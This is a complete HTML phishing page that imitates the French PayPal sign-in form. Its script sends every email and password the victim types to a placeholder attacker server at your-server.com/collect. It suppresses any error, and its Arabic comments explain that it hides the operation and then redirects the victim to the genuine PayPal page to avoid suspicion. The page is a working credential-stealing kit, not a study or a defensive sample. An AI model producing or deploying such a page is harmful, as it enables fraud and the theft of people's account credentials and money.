<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Connexion - PayPal</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f0f2f5; }
    .login-box { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input, button { width: 100%; margin: 8px 0; padding: 10px; }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://www.paypalobjects.com/images/shared/logo.svg" alt="PayPal" width="150" />
    <h2>Connexion à votre compte</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Adresse email" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <button type="submit">Connexion</button>
    </form>
    <pre id="log" style="background:#eee; padding:10px; height:150px; overflow:auto; display:none;"></pre>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const log = document.getElementById('log');
    const fakeEmail = 'ereex@gmail.com';
    const fakePass = 'ereex2009';

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      // أرسل البيانات إلى خادمك
      fetch('https://your-server.com/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email, password})
      }).catch(() => {
        // في حالة الفشل لا تظهر أي خطأ
      });

      // سجل محلي لإخفاء العملية
      log.textContent += `Email: ${email}, Password: ${password}\nCompte enregistré: ${fakeEmail} / ${fakePass}\n\n`;

      // إعادة تعيين الحقول
      form.reset();

      // إعادة توجيه للصفحة الرسمية لإخفاء أي شك
      window.location.href = "https://www.paypal.com/signin";
    });
  </script>
</body>
</html>
